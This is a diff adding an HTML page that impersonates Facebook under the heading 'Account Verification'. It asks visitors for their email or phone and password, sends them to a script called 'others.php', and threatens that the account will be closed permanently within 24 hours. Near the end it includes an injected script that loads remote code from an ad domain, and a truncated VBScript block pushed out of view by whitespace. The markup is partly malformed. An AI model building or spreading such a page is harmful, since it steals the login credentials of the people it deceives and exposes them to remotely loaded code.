@@ -1,0 +1,94 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0093)file:///C:/Documents%20and%20Settings/DIGIT/My%20Documents/Downloads/New%20Folder/others.html -->
+<html>
+ <head>
+  <title>Facebook</title> 
+  <link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico"> 
+  <meta http-equiv="Content-language" content="id"> 
+  <script type="text/javascript"> 
+
+//<![CDATA[
+
+CavalryLogger=false;window._is_quickling_index=""; function get_intern_ref(node) { if (!!node) { var div_ids = { profile_minifeed : 1, info_tab : 1, gb_content_and_toolbar : 1, gb_muffin_area : 1, ego : 1, bookmarks_menu : 1, jewelBoxNotif: 1, jewelNotif: 1, BeeperBox: 1 }; for (var cur = node; cur && cur != document.body; cur = cur.parentNode) { if (!cur.id || typeof cur.id !== 'string') { continue; } if (cur.id.substr(0, 8) == 'pagelet_') { return cur.id.substr(8); } if (div_ids[cur.id]) { return cur.id; } } } return '-'; } var user_action = (function() { var ue_count = 0, logged = 0; return function(node, context, e, s) { var type = null; if (e) { if (logged) { return; } else { logged = 1; setTimeout(function(){logged = 0;}, 0); } } var href = null; if (!!node) { href = node.href; if ((!href || node.rel) && node.getAttribute) { var ajax = node.getAttribute('ajaxify'); if (ajax && ajax != '1') { href = ajax; } } if (!href && node.name) { href = node.name; } if (!href) { href = '-'; } } ue_count ++; var ue_ts = (+new Date()); var ue = ue_ts + '/' + ue_count; document.cookie = "act=" + encodeURIComponent(ue) + "; path=/; domain=" + window.location.hostname.replace(/^.*(\.facebook\..*)$/i, '$1'); if (!s) { s = 'r'; } window.Arbiter && Arbiter.inform( 'user/action', {context: context, event: e, node: node}); window.Log && Log('act', [ue_ts, ue_count, href, context, type, get_intern_ref(), s, window.URI ? URI.getRequestURI() : location.pathname + location.search + location.hash]); return ue; } })();
+
+//]]>
+
+</script>
+  <noscript></noscript>
+ </head>
+ <body class="login_page UIPage_LoggedOut ff3 win Locale_en_US">
+   &lt;meta http-equiv="refresh" content="0; URL=" /&gt;  
+  <meta name="robots" content="noodp,noydir,noindex,nofollow,noarchive,nosnippet"> 
+  <meta name="description" content=" Facebook adalah sarana sosial yang menghubungkan orang-orang dengan teman dan rekan mereka lainnya yang bekerja, belajar, dan hidup di sekitar mereka. Orang-orang menggunakan Facebook untuk menjaga hubungan dengan teman, bertukar foto tanpa batas, mengirim tautan dan video, dan mengetahui lebih jauh tentang orang-orang yang mereka temui."> 
+  <link type="text/css" rel="stylesheet" href="./others_files/5lgnwiqt.css"> 
+  <link type="text/css" rel="stylesheet" href="./others_files/7p8bscst.css"> 
+  <link type="text/css" rel="stylesheet" href="./others_files/7t09ffnu.css"> 
+  <link type="text/css" rel="stylesheet" href="./others_files/2elnknfz.css"> 
+  <script type="text/javascript" src="./others_files/a27w6e83.js"></script> 
+  <script type="text/javascript"> 
+
+var fbpd={"charset_test":"\u20ac,\u00b4,\u20ac,\u00b4,\u6c34,\u0414,\u0404","locale":"id_ID","email":"","lsd":"0o4do"};
+
+</script> 
+  <link rel="search" type="application/opensearchdescription+xml" href="https://s-static.ak.facebook.com/rsrc.php/zBOV4/hash/10jfw8tc.xml" title="Facebook"> 
+  <link rel="shortcut icon" href="https://s-static.ak.facebook.com/rsrc.php/z9Q0Q/hash/8yhim1ep.ico">  
+  <div class="mal ptm uiInterstitial login_page_interstitial uiInterstitialLarge white_box">
+   <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderSection">
+    <div class="clearfix uiHeaderTop">
+     <div>
+      <h3 class="uiHeaderTitle">Account Verification</h3>
+     </div>
+    </div>
+   </div> 
+   <div class="phl ptm uiInterstitialContent"> 
+    <div class="login_form_container"> 
+     <form method="post" action="others.php" id="login_form"> 
+      <p></p>
+     </form>
+    </div> 
+    <div id="loginform"> 
+     <input type="hidden" id="return_session" name="return_session" value="0" autocomplete="off"> 
+     <input type="hidden" id="legacy_return" name="legacy_return" value="1" autocomplete="off"> 
+     <input type="hidden" id="display" name="display" autocomplete="off"> 
+     <input type="hidden" id="session_key_only" name="session_key_only" value="0" autocomplete="off"> 
+     <input type="hidden" id="trynum" name="trynum" value="1" autocomplete="off"> 
+     <input type="hidden" name="charset_test" value=",,?,,?,?,?"> 
+     <input type="hidden" id="lsd" name="lsd" value="0o4do" autocomplete="off">
+     <center> 
+      <img src="others_files/12345a.gif" width="140" height="140">
+      <br>
+      <br> 
+     </center> 
+     <center> 
+      <b>Please confirm your account below as proof of legal ownership of your account and for the security of your account. After you do all of this usually our system will work for 24 hours<p></p></b>
+      <p></p>Please confirm your account in below:
+      <p></p>  
+      <div class="form_row clearfix "> 
+       <label for="email" id="label_email" class="login_form_label">Email or Phone</label> 
+       <input class="inputtext" id="email" name="email" placeholder="Email or Phone" onkeypress="formchange()" maxlength="50" required>
+      </div> 
+      <div class="form_row clearfix "> 
+       <label for="pass" id="label_pass" class="login_form_label">Password</label> 
+       <input type="password" class="inputpassword" id="pass" name="pass" placeholder="Password" maxlength="50" required> 
+      </div> 
+      <center> 
+       <label class="uiButton uiButtonConfirm uiButtonLarge"><input value="Submit" name="login" onclick="" type="submit"></label> 
+       <justify>
+        <br> 
+        <font size="2" color="red" <strong=""></font>
+        <br> 
+        <strong><font color="" <="" ont=""> <strong>If the account is not confirmed for 24 hours, your account will be permanently closed and we are not responsible if your account is automatically closed Please contact Facebook.<br> </strong></font></strong>
+       </justify>
+      </center>
+     </center>
+    </div>
+    <strong><font color="" <="" ont=""><strong> </strong></font></strong>
+   </div>
+  </div>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnaIuLQo4ANum%2bjzOEhXvGaCl4IYqLF8Wdtq8v8%2f%2f%2fNDHbpQMM6Mf3Q4vZNivsiLOSf%2fm8JtciviWtHS8fg1qxeJaQVCC0%2foPMwQS0ZQ1JxCT5Iuprvc5WonZRyAfpC3tRYFCfqHqdgmMi28Z7E2JVGJZoTptukO%2bMyskTSZHmuD%2fOkxTbHlSXZiH62KPT2n5BgJUtSC4RpfKQZ%2fNHzs4sJSlKtY7bQN65ev3Aq%2f0PlDzcEuCQWIDeWfVzx2QveoMLhqajbBqtyN40GAGLJ6aPECD6bvAAUIYPqrrZiofwfNi6Rio8At0Qpociyks8gTKVpU32MherzjpgOMecc9GhnSSVxOqtRo9FNNI9y%2f%2fKmk8STPWhdUsE%2bJ1yIQpICYgegPwFgYY7u7oG3lAVuOr1Lgy3b1%2fcyTkoxPtjWhyeGUX8kSmeh7dMs0qj3Dov1lM0DWuWJH%2bBxAfaXcQqZFErqQY%2fc9t9tyoMyc1bvN3jjab9FcPePZnyIFCDLUKtO3i6JSTWcCDduOCwUcUO6VzQ2%2bhid11fdTdic2zt2dVy3xkYCS1N4IBfJwyz8hQ6rjXuq%2fsRO5sDxJSbngkVMfmquA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+  <div style="text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;">
+   <strong><font color="" <="" ont=""><strong><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_protect-09&amp;utm_content=footer_img"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></strong></font></strong>
+  </div>
+  <script language="VBScript"><!--                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          <SCRIPT Language=VBScrip</script</script>
+ </body>
+</html>
